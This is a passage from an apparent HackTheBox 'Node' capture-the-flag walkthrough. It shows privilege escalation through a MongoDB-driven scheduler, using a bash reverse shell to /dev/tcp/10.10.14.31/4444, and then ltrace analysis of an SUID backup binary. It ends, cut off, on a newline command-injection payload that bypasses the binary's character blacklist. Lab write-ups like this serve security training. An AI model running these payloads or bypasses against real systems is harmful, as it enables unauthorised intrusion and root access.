data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre><td class="rouge-code"><pre> mark@node:/home/tom$ cat /var/scheduler/app.js
 const exec        = require('child_process').exec;
 const MongoClient = require('mongodb').MongoClient;
 const ObjectID    = require('mongodb').ObjectID;
 const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&amp;authSource=scheduler';

 MongoClient.connect(url, function(error, db) {
   if (error || !db) {
     console.log('[!] Failed to connect to mongodb');
     return;
   }

   setInterval(function () {
     db.collection('tasks').find().toArray(function (error, docs) {
       if (!error &amp;&amp; docs) {
         docs.forEach(function (doc) {
           if (doc) {
             console.log('Executing task ' + doc._id + '...');
             exec(doc.cmd);
             db.collection('tasks').deleteOne({ _id: new ObjectID(doc._id) });
           }
         });
       }
       else if (error) {
         console.log('Something went wrong: ' + error);
       }
     });
   }, 30000);

 });
</pre></table></code></div></div><ul><li>What it does?<ol><li>Scheduler app is connecting to the MongoDB database w/ <code class="language-plaintext highlighter-rouge">mark</code>’s credentials periodically,<li>Retreiving values called <code class="language-plaintext highlighter-rouge">cmd</code> from the <code class="language-plaintext highlighter-rouge">task</code> collection,<li>Executing <code class="language-plaintext highlighter-rouge">cmd</code> and<li>Deleting the <code class="language-plaintext highlighter-rouge">cmd</code> value from <code class="language-plaintext highlighter-rouge">task</code> collection after executing it<li>Since this application is started by <code class="language-plaintext highlighter-rouge">tom</code>, the command executed will be executed as <code class="language-plaintext highlighter-rouge">tom</code> allowing us to privilege escalate.</ol></ul><li>To exploit this, we add a value into <code class="language-plaintext highlighter-rouge">cmd</code> from <code class="language-plaintext highlighter-rouge">task</code> collection, that will execute a reverse shell, allowing us privilege escalate to <code class="language-plaintext highlighter-rouge">tom</code><li>Exploiting <code class="language-plaintext highlighter-rouge">scheduler</code><ol><li>Connect to MongoDB w/ <code class="language-plaintext highlighter-rouge">mark</code> credentials<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre> mark@node:/home/tom$ mongo -u mark -p 5AYRft73VtFpc84k  scheduler
 MongoDB shell version: 3.2.16
 connecting to: scheduler
 &gt; show collections
 tasks
</pre></table></code></div></div><li>Create reverse shell payload<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre> mark@node:/tmp$ printf '#!/bin/bash\n\n /bin/bash -i &gt;&amp; /dev/tcp/10.10.14.31/4444 0&gt;&amp;1\n' &gt; exploit; chmod 4777 exploit;
</pre></table></code></div></div><li>Add value into <code class="language-plaintext highlighter-rouge">cmd</code> from <code class="language-plaintext highlighter-rouge">task</code> collection that will execute our reverse shell payload we just created<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre> db.tasks.insert( {_id: 0, cmd: "/tmp/exploit"} )
 WriteResult({ "nInserted" : 1 })
</pre></table></code></div></div><li>Shell obtained <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Node/images/Pasted%20image%2020220827175108.png" alt="" data-proofer-ignore></ol><li>User Flag<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre> tom@node:~$ cat user.txt
 cat user.txt
 e1156acc3574e04b06908ecf76be91b1
 tom@node:~$ 
</pre></table></code></div></div></ol><h2 id="root---via-command-injection">Root - Via Command Injection <a href="#root---via-command-injection" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Enumerate SUID files<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre> tom@node:~$ find / -perm -4000 2&gt;/dev/null
 /usr/lib/eject/dmcrypt-get-device
 /usr/lib/snapd/snap-confine
 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
 /usr/lib/openssh/ssh-keysign
 /usr/lib/policykit-1/polkit-agent-helper-1
 /usr/local/bin/backup
 /usr/bin/chfn
 /usr/bin/at
 /usr/bin/gpasswd
 /usr/bin/newgidmap
 /usr/bin/chsh
 /usr/bin/sudo
 /usr/bin/pkexec
 /usr/bin/newgrp
 /usr/bin/passwd
 /usr/bin/newuidmap
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">/usr/local/bin/backup</code></ul><li>View contents of <code class="language-plaintext highlighter-rouge">/usr/local/bin/backup</code> w/ <code class="language-plaintext highlighter-rouge">strings</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre><td class="rouge-code"><pre> tom@node:/tmp$ strings /usr/local/bin/backup

 ...
              ____________________________________________________
             /                                                    \
            |    _____________________________________________     |
            |   |                                             |    |
            |   |             Secure Backup v1.0              |    |
            |   |_____________________________________________|    |
            |                                                      |
             \_____________________________________________________/
                    \_______________________________________/
                 _______________________________________________
              _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_
           _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_
        _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_
     _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_
  _-'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_
 :-----------------------------------------------------------------------------:
 `---._.-----------------------------------------------------------------._.---'
 Could not open file
 Validated access token
 Ah-ah-ah! You didn't say the magic word!
 Finished! Encoded backup is below:
 UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==
 /root
 /etc
 /tmp/.backup_%i
 /usr/bin/zip -r -P magicword %s %s &gt; /dev/null
 /usr/bin/base64 -w0 %s
 ...
</pre></table></code></div></div><ul><li>There is a base64 encoded backup<li><code class="language-plaintext highlighter-rouge">/usr/bin/zip -r -P magicword %s %s &gt; /dev/null</code><ul><li>Directory we specified will be zipped with password <code class="language-plaintext highlighter-rouge">magicword</code></ul></ul><li>Earlier, <code class="language-plaintext highlighter-rouge">app.js</code> revealed Mark’s credentials, it also contains information about the binary <code class="language-plaintext highlighter-rouge">backup</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Node/images/Pasted%20image%2020220313220503.png" alt="" data-proofer-ignore><ul><li><code class="language-plaintext highlighter-rouge">-q &lt;backup_key&gt; &lt;directory name to backup&gt;</code></ul><li>Attempt to backup <code class="language-plaintext highlighter-rouge">/etc/</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre> tom@node:/tmp$ backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /etc/
  [+] Finished! Encoded backup is below:

 UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==
</pre></table></code></div></div><ul><li>Matches the base64 encoded text from above, meaning it is hardcoded into the binary</ul><li>Decode &amp; unzip<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/node/10.10.10.58/loot]
 └─# 7z e decoded.zip 

 ┌──(root💀kali)-[~/htb/node/10.10.10.58/loot]
 └─# cat root.txt 
 QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ
 QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ
 QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ
 QQQQQQQQQQQQQQQQQQQWQQQQQWWWBBBHHHHHHHHHBWWWQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ
 QQQQQQQQQQQQQQQD!`__ssaaaaaaaaaass_ass_s____.  -~""??9VWQQQQQQQQQQQQQQQQQQQ
 QQQQQQQQQQQQQP'_wmQQQWWBWV?GwwwmmWQmwwwwwgmZUVVHAqwaaaac,"?9$QQQQQQQQQQQQQQ
 QQQQQQQQQQQW! aQWQQQQW?qw#TTSgwawwggywawwpY?T?TYTYTXmwwgZ$ma/-?4QQQQQQQQQQQ
 QQQQQQQQQQW' jQQQQWTqwDYauT9mmwwawww?WWWWQQQQQ@TT?TVTT9HQQQQQQw,-4QQQQQQQQQ
 QQQQQQQQQQ[ jQQQQQyWVw2$wWWQQQWWQWWWW7WQQQQQQQQPWWQQQWQQw7WQQQWWc)WWQQQQQQQ
 QQQQQQQQQf jQQQQQWWmWmmQWU???????9WWQmWQQQQQQQWjWQQQQQQQWQmQQQQWL 4QQQQQQQQ
 QQQQQQQP'.yQQQQQQQQQQQP"       &lt;wa,.!4WQQQQQQQWdWP??!"??4WWQQQWQQc ?QWQQQQQ
 QQQQQP'_a.&lt;aamQQQW!&lt;yF "!` ..  "??$Qa "WQQQWTVP'    "??' =QQmWWV?46/ ?QQQQQ
 QQQP'sdyWQP?!`.-"?46mQQQQQQT!mQQgaa. &lt;wWQQWQaa _aawmWWQQQQQQQQQWP4a7g -WWQQ
 QQ[ j@mQP'adQQP4ga, -????" &lt;jQQQQQWQQQQQQQQQWW;)WQWWWW9QQP?"`  -?QzQ7L ]QQQ
 QW jQkQ@ jWQQD'-?$QQQQQQQQQQQQQQQQQWWQWQQQWQQQc "4QQQQa   .QP4QQQQfWkl jQQQ
 QE ]QkQk $D?`  waa "?9WWQQQP??T?47`_aamQQQQQQWWQw,-?QWWQQQQQ`"QQQD\Qf(.QWQQ
 QQ,-Qm4Q/-QmQ6 "WWQma/  "??QQQQQQL 4W"- -?$QQQQWP`s,awT$QQQ@  "QW@?$:.yQQQQ
 QQm/-4wTQgQWQQ,  ?4WWk 4waac -???$waQQQQQQQQF??'&lt;mWWWWWQW?^  ` ]6QQ' yQQQQQ
 QQQQw,-?QmWQQQQw  a,    ?QWWQQQw _.  "????9VWaamQWV???"  a j/  ]QQf jQQQQQQ
 QQQQQQw,"4QQQQQQm,-$Qa     ???4F jQQQQQwc &lt;aaas _aaaaa 4QW ]E  )WQ`=QQQQQQQ
 QQQQQQWQ/ $QQQQQQQa ?H ]Wwa,     ???9WWWh dQWWW,=QWWU?  ?!     )WQ ]QQQQQQQ
 QQQQQQQQQc-QWQQQQQW6,  QWQWQQQk &lt;c                             jWQ ]QQQQQQQ
 QQQQQQQQQQ,"$WQQWQQQQg,."?QQQQ'.mQQQmaa,.,                . .; QWQ.]QQQQQQQ
 QQQQQQQQQWQa ?$WQQWQQQQQa,."?( mQQQQQQW[:QQQQm[ ammF jy! j( } jQQQ(:QQQQQQQ
 QQQQQQQQQQWWma "9gw?9gdB?QQwa, -??T$WQQ;:QQQWQ ]WWD _Qf +?! _jQQQWf QQQQQQQ
 QQQQQQQQQQQQQQQws "Tqau?9maZ?WQmaas,,    --~-- ---  . _ssawmQQQQQQk 3QQQQWQ
 QQQQQQQQQQQQQQQQWQga,-?9mwad?1wdT9WQQQQQWVVTTYY?YTVWQQQQWWD5mQQPQQQ ]QQQQQQ
 QQQQQQQWQQQQQQQQQQQWQQwa,-??$QwadV}&lt;wBHHVHWWBHHUWWBVTTTV5awBQQD6QQQ ]QQQQQQ
 QQQQQQQQQQQQQQQQQQQQQQWWQQga,-"9$WQQmmwwmBUUHTTVWBWQQQQWVT?96aQWQQQ ]QQQQQQ
 QQQQQQQQQQWQQQQWQQQQQQQQQQQWQQma,-?9$QQWWQQQQQQQWmQmmmmmQWQQQQWQQW(.yQQQQQW
 QQQQQQQQQQQQQWQQQQQQWQQQQQQQQQQQQQga%,.  -??9$QQQQQQQQQQQWQQWQQV? sWQQQQQQQ
 QQQQQQQQQWQQQQQQQQQQQQQQWQQQQQQQQQQQWQQQQmywaa,;~^"!???????!^`_saQWWQQQQQQQ
 QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQWWWWQQQQQmwywwwwwwmQQWQQQQQQQQQQQ
 QQQQQQQWQQQWQQQQQQWQQQWQQQQQWQQQQQQQQQQQQQQQQWQQQQQWQQQWWWQQQQQQQQQQQQQQQWQ
</pre></table></code></div></div><ul><li>Did the same for <code class="language-plaintext highlighter-rouge">/root</code><ul><li><code class="language-plaintext highlighter-rouge">/etc/</code><li><code class="language-plaintext highlighter-rouge">/root</code><li>Hard coded into displaying this troll face, we have to bypass it somehow.</ul></ul><li>Use <code class="language-plaintext highlighter-rouge">ltrace</code> to intercept and record dynamic library calls by <code class="language-plaintext highlighter-rouge">backup</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
</pre><td class="rouge-code"><pre> tom@node:/usr/local/bin$ ltrace backup -q '' /home/tom/user.txt
 __libc_start_main(0x80489fd, 4, 0xff9149f4, 0x80492c0 &lt;unfinished ...&gt;
 geteuid()                                                               = 1000
 setuid(1000)                                                            = 0
 strcmp("-q", "-q")                                                      = 0
 strncpy(0xff9148b8, "", 100)                                            = 0xff9148b8
 strcpy(0xff9148a1, "/")                                                 = 0xff9148a1
 strcpy(0xff9148ad, "/")                                                 = 0xff9148ad
 strcpy(0xff914837, "/e")                                                = 0xff914837
 strcat("/e", "tc")                                                      = "/etc"
 strcat("/etc", "/m")                                                    = "/etc/m"
 strcat("/etc/m", "yp")                                                  = "/etc/myp"
 strcat("/etc/myp", "la")                                                = "/etc/mypla"
 strcat("/etc/mypla", "ce")                                              = "/etc/myplace"
 strcat("/etc/myplace", "/k")                                            = "/etc/myplace/k"
 strcat("/etc/myplace/k", "ey")                                          = "/etc/myplace/key"
 strcat("/etc/myplace/key", "s")                                         = "/etc/myplace/keys"
 fopen("/etc/myplace/keys", "r")                                         = 0x8252008
 fgets("a01a6aa5aaf1d7729f35c8278daae30f"..., 1000, 0x8252008)           = 0xff91444f
 strcspn("a01a6aa5aaf1d7729f35c8278daae30f"..., "\n")                    = 64
 strcmp("", "a01a6aa5aaf1d7729f35c8278daae30f"...)                       = -1
 fgets("45fac180e9eee72f4fd2d9386ea7033e"..., 1000, 0x8252008)           = 0xff91444f
 strcspn("45fac180e9eee72f4fd2d9386ea7033e"..., "\n")                    = 64
 strcmp("", "45fac180e9eee72f4fd2d9386ea7033e"...)                       = -1
 fgets("3de811f4ab2b7543eaf45df611c2dd25"..., 1000, 0x8252008)           = 0xff91444f
 strcspn("3de811f4ab2b7543eaf45df611c2dd25"..., "\n")                    = 64
 strcmp("", "3de811f4ab2b7543eaf45df611c2dd25"...)                       = -1
 fgets("\n", 1000, 0x8252008)                                            = 0xff91444f
 strcspn("\n", "\n")                                                     = 0
 strcmp("", "")                                                          = 0
 fgets(nil, 1000, 0x8252008)                                             = 0
 strstr("/home/tom/user.txt", "..")                                      = nil
 strstr("/home/tom/user.txt", "/root")                                   = nil
 strchr("/home/tom/user.txt", ';')                                       = nil
 strchr("/home/tom/user.txt", '&amp;')                                       = nil
 strchr("/home/tom/user.txt", '`')                                       = nil
 strchr("/home/tom/user.txt", '$')                                       = nil
 strchr("/home/tom/user.txt", '|')                                       = nil
 strstr("/home/tom/user.txt", "//")                                      = nil
 strcmp("/home/tom/user.txt", "/")                                       = 1
 strstr("/home/tom/user.txt", "/etc")                                    = nil
 strcpy(0xff91425b, "/home/tom/user.txt")                                = 0xff91425b
 getpid()                                                                = 2328
 time(0)                                                                 = 1661598059
 clock(0, 0, 0, 0)                                                       = 1564
 srand(0x3ee45a2, 0x151bd39a, 0x3ee45a2, 0x804918c)                      = 0
 rand(0, 0, 0, 0)                                                        = 0x6f4812d8
 sprintf("/tmp/.backup_1866994392", "/tmp/.backup_%i", 1866994392)       = 23
 sprintf("/usr/bin/zip -r -P magicword /tm"..., "/usr/bin/zip -r -P magicword %s "..., "/tmp/.backup_1866994392", "/home/tom/user.txt") = 83
 system("/usr/bin/zip -r -P magicword /tm"... &lt;no return ...&gt;
 --- SIGCHLD (Child exited) ---
 &lt;... system resumed&gt; )                                                  = 0
 access("/tmp/.backup_1866994392", 0)                                    = 0
 sprintf("/usr/bin/base64 -w0 /tmp/.backup"..., "/usr/bin/base64 -w0 %s", "/tmp/.backup_1866994392") = 43
 system("/usr/bin/base64 -w0 /tmp/.backup"...UEsDBAoACQAAAIpQG1V42e7cLQAAACEAAAARABwAaG9tZS90b20vdXNlci50eHRVVAkAAxTeCWP69wljdXgLAAEEAAAAAAToAwAAYua/TKLRwymJYEfzktmCOCbIXj3FiHllGTBPArgJMmJavagIUq2NLg2eXV/+UEsHCHjZ7twtAAAAIQAAAFBLAQIeAwoACQAAAIpQG1V42e7cLQAAACEAAAARABgAAAAAAAEAAACggQAAAABob21lL3RvbS91c2VyLnR4dFVUBQADFN4JY3V4CwABBAAAAAAE6AMAAFBLBQYAAAAAAQABAFcAAACIAAAAAAA= &lt;no return ...&gt;
 --- SIGCHLD (Child exited) ---
 &lt;... system resumed&gt; )                                                  = 0
 remove("/tmp/.backup_1866994392")                                       = 0
 fclose(0x8252008)                                                       = 0
 +++ exited (status 0) +++
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">system("/usr/bin/zip -r -P magicword /tm"... &lt;no return ...&gt;</code><ul><li><code class="language-plaintext highlighter-rouge">system</code> is called, command injection is possible<li><code class="language-plaintext highlighter-rouge">&lt;no return..&gt;</code> because the command is too long, earlier w/ <code class="language-plaintext highlighter-rouge">strings</code> we can see that the full command is:<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>  /usr/bin/zip -r -P magicword %s %s &gt; /dev/null
</pre></table></code></div></div></ul><li>Filtered/Bad characters, displays troll face<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>  strstr("/home/tom/user.txt", "..")                                      
  strstr("/home/tom/user.txt", "/root")                                   
  strchr("/home/tom/user.txt", ';')                                       
  strchr("/home/tom/user.txt", '&amp;')                                       
  strchr("/home/tom/user.txt", '`')                                       
  strchr("/home/tom/user.txt", '$')                                       
  strchr("/home/tom/user.txt", '|')                                       
  strstr("/home/tom/user.txt", "//")                                      
  strcmp("/home/tom/user.txt", "/")                                       
  strstr("/home/tom/user.txt", "/etc")          
</pre></table></code></div></div></ul><li>Command Injection<ol><li>How does the exploit work?<ul><li>Usually by chaining <code class="language-plaintext highlighter-rouge">;</code>, <code class="language-plaintext highlighter-rouge">|</code>, <code class="language-plaintext highlighter-rouge">&amp;</code>, we are able to do command injection, however it is blacklisted.<li>Instead, we can use <code class="language-plaintext highlighter-rouge">printf</code> or <code class="language-plaintext highlighter-rouge">'</code> to inject a newline (<code class="language-plaintext highlighter-rouge">\n</code>) into the command, allowing us to do command injection.<li>Also, all output is being redirected to <code class="language-plaintext highlighter-rouge">/dev/null</code>, we have to bypass it by adding another command at the end so that instead of our shell <code class="language-plaintext highlighter-rouge">/bin/bash</code>, the other command is redirected to <code class="language-plaintext highlighter-rouge">/dev/null</code><li><code class="language-plaintext highlighter-rouge">system</code> will allow us to do a newline(<code class="language-plaintext highlighter-rouge">\n</code>) to execute code<li>Example payload:<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>  printf(\n&lt;command to execute&gt;\n&lt;any commmand so that this command is redirected to /dev/null&gt;)
</pre></table></code></div></div></ul><li>Do command injection w/ <code class="language-plaintext highlighter-rouge">printf</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre> tom@node:~$ /usr/local/bin/backup -q 'a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508' "$(printf '\ntest\n/bin/bash\ntest')"
